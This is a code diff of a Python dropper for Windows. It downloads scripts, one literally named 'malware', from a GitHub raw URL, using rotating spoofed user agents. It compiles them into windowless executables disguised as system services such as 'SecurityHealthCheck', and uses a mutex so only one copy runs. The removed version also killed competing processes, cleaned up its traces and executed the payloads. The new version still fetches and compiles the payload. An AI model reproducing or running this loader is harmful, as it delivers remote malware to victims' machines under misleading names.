@@ -1,20 +1,80 @@
-import urllib.request
 import os
-import subprocess
+import sys
 import random
 import shutil
-import ctypes
-import sys
+import subprocess
+import urllib.request
 import win32api
-import win32con
 import win32event
-import win32clipboard
-import psutil
+import time
+
+def compile_python_to_exe(py_file_path):
+    try:
+        if py_file_path:
+            temp_dir = os.getenv('TEMP')
+            dist_folder = os.path.join(temp_dir, "dist")
+            build_folder = os.path.join(temp_dir, "build")
+
+            print(f"Compiling {py_file_path} to exe")
+            subprocess.call([
+                'pyinstaller',
+                '--onefile',
+                '--noconsole',
+                '--icon=NONE',
+                f'--distpath={dist_folder}',
+                f'--workpath={build_folder}',
+                py_file_path
+            ], shell=True)
+
+            exe_file_path = os.path.join(dist_folder, os.path.basename(py_file_path).replace(".py", ".exe"))
+            if os.path.exists(exe_file_path):
+                exe_dest = os.path.join(temp_dir, os.path.basename(exe_file_path))
+                shutil.move(exe_file_path, exe_dest)
+                return exe_dest
+            else:
+                print(f"Error: Exe file not found for {py_file_path}")
+                return None
+    except Exception as e:
+        print(f"Error compiling to exe: {e}")
+        return None
+
+def fetch_python_code(url):
+    try:
+        user_agents = [
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
+            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",
+        ]
+        user_agent = random.choice(user_agents)
+        headers = {'User-Agent': user_agent}
+        req = urllib.request.Request(url, headers=headers)
+        with urllib.request.urlopen(req) as response:
+            return response.read().decode('utf-8')
+    except Exception as e:
+        print(f"Error fetching code from {url}: {e}")
+        return None
+
+def write_python_file(code, filename):
+    try:
+        if code:
+            temp_dir = os.getenv('TEMP')
+            py_file_path = os.path.join(temp_dir, filename)
+            with open(py_file_path, 'w', encoding='utf-8') as f:
+                f.write(code)
+            return py_file_path
+        else:
+            print(f"Error: No code to write for {filename}")
+            return None
+    except Exception as e:
+        print(f"Error writing file {filename}: {e}")
+        return None
 
 def create_mutex(mutex_name):
     try:
         mutex = win32event.CreateMutex(None, 0, mutex_name)
-        if win32api.GetLastError() == 183:  
+        if win32api.GetLastError() == 183:
             print("Mutex already exists. Exiting.")
             return False
         return True
@@ -22,152 +82,30 @@ def create_mutex(mutex_name):
         print(f"Failed to create mutex: {e}")
         return False
 
-def check_process_running(process_names):
-    try:
-        for proc in psutil.process_iter(['pid', 'name']):
-            if proc.info['name'] in process_names:
-                print(f"Process {proc.info['name']} is running. Exiting.")
-                return True
-        return False
-    except Exception as e:
-        print(f"Error checking running processes: {e}")
-        return False
-
-def kill_running_processes(process_names):
-    try:
-        for proc in psutil.process_iter(['pid', 'name']):
-            if proc.info['name'] in process_names:
-                proc.kill()
-                print(f"Killed process: {proc.info['name']} (PID: {proc.info['pid']})")
-    except Exception as e:
-        print(f"Error killing processes: {e}")
+def download_and_compile_scripts(urls_and_filenames):
+    for url, filename in urls_and_filenames:
+        code = fetch_python_code(url)
+        if code:
+            py_file_path = write_python_file(code, filename)
+            if py_file_path:
+                exe_file = compile_python_to_exe(py_file_path)
+                if exe_file:
+                    print(f"Executable created: {exe_file}")
+                    os.remove(py_file_path)
+                else:
+                    print(f"Failed to compile {filename}")
+            else:
+                print(f"Failed to write {filename}")
+        else:
+            print(f"Failed to fetch code from {url}")
 
 if os.name == "nt":
     mutex_name = "SecurityHealthCheck"
     if not create_mutex(mutex_name):
         sys.exit(0)
 
-def main_run():
-    user_agents = [
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
-        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",
-    ]
-
-    def fetch_python_code(url):
-        try:
-            user_agent = random.choice(user_agents)
-            headers = {'User-Agent': user_agent}
-            req = urllib.request.Request(url, headers=headers)
-            with urllib.request.urlopen(req) as response:
-                return response.read().decode('utf-8')
-        except Exception as e:
-            print(f"Error fetching code from {url}: {e}")
-            return None
-
-    def write_python_file(code, filename):
-        try:
-            if code:
-                temp_dir = os.getenv('TEMP')
-                py_file_path = os.path.join(temp_dir, filename)
-                with open(py_file_path, 'w', encoding='utf-8') as f:
-                    f.write(code)
-                return py_file_path
-            else:
-                print(f"Error: No code to write for {filename}")
-                return None
-        except Exception as e:
-            print(f"Error writing file {filename}: {e}")
-            return None
-
-    def compile_python_to_exe(py_file_path):
-        try:
-            if py_file_path:
-                temp_dir = os.getenv('TEMP')
-
-                dist_folder = os.path.join(temp_dir, "dist")
-                build_folder = os.path.join(temp_dir, "build")
-                
-                print(f"Compiling {py_file_path} to exe")
-                subprocess.call([
-                    'pyinstaller',
-                    '--onefile',
-                    '--noconsole',
-                    '--icon=NONE',
-                    f'--distpath={dist_folder}',
-                    f'--workpath={build_folder}',
-                    py_file_path
-                ], shell=True)
-
-                exe_file_path = os.path.join(dist_folder, os.path.basename(py_file_path).replace(".py", ".exe"))
-                
-                if os.path.exists(exe_file_path):
-                    exe_dest = os.path.join(temp_dir, os.path.basename(exe_file_path))
-                    shutil.move(exe_file_path, exe_dest)
-                    return exe_dest
-                else:
-                    print(f"Error: Exe file not found for {py_file_path}")
-                    return None
-        except Exception as e:
-            print(f"Error compiling to exe: {e}")
-            return None
-
-    def execute_exe_file(exe_file_path):
-        try:
-            if exe_file_path:
-                print(f"Executing {exe_file_path}")
-                subprocess.call([exe_file_path], shell=True)
-        except Exception as e:
-            print(f"Error executing {exe_file_path}: {e}")
-
-    def clean_up(py_file_path, dist_folder, build_folder):
-        try:
-            if os.path.exists(py_file_path):
-                os.remove(py_file_path)
-            
-            for folder in [dist_folder, build_folder]:
-                if os.path.exists(folder):
-                    if os.path.isdir(folder):
-                        shutil.rmtree(folder)
-        except Exception as e:
-            pass
-
     urls_and_filenames = [
-        ("https://raw.githubusercontent.com/247msn/96737693845/refs/heads/main/malware", "NetworkIntegrityService.py"),
         ("https://raw.githubusercontent.com/247msn/96737693845/refs/heads/main/watchdog1", "SystemResourceMonitor.py"),
-        ("https://raw.githubusercontent.com/247msn/96737693845/refs/heads/main/watchdog2", "SecurityHealthCheck.py"),
+        ("https://raw.githubusercontent.com/247msn/96737693845/refs/heads/main/malware", "NetworkIntegrityService.py"),
     ]
-
-    filenames = [filename for _, filename in urls_and_filenames]
-    
-    if not check_process_running(filenames):
-        kill_running_processes(filenames)
-
-        temp_dir = os.getenv('TEMP')
-        python_files = []
-        for url, filename in urls_and_filenames:
-            code = fetch_python_code(url)
-            if code:
-                py_file_path = write_python_file(code, filename)
-                if py_file_path:
-                    python_files.append(py_file_path)
-
-        exe_files = []
-        for py_file_path in python_files:
-            exe_file_path = compile_python_to_exe(py_file_path)
-            if exe_file_path:
-                exe_files.append(exe_file_path)
-
-        for py_file_path in python_files:
-            dist_folder = os.path.join(temp_dir, "dist")
-            build_folder = os.path.join(temp_dir, "build")
-            clean_up(py_file_path, dist_folder, build_folder)
-
-        for exe_file_path in exe_files:
-            execute_exe_file(exe_file_path)
-
-    sys.exit(0)
-
-main_run()
+    download_and_compile_scripts(urls_and_filenames)
